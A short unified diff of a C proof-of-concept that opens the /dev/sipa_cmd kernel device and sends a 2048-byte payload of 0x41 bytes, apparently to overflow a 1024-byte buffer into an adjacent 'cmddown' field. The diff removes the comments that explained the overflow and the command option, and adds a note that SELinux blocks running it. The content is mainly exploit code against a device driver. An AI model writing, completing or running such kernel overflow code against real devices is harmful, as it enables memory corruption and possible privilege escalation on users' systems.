@@ -22,11 +22,10 @@ int main() {
     int fd = open("/dev/sipa_cmd", O_RDWR);
     if (fd < 0) { perror("open"); return 1; }
 
-    // DATA_MAX_LEN = 1024, we send 2048 bytes to overflow into cmddown
     uint32_t payload_size = 2048;
     size_t total_size = sizeof(struct dev_comm_data) + payload_size;
     struct dev_comm_data *msg = calloc(1, total_size);
-    msg->opt = 0;               // OPT_SET_CAL_VAL
+    msg->opt = 0;               
     msg->param_id = 0;
     msg->payload_size = payload_size;
     memset(msg->payload, 0x41, payload_size);
@@ -44,3 +43,4 @@ int main() {
     close(fd);
     return 0;
 }
+// this migth work if you can make it load problem is root SElinux blocks it for me therefore i cant run it
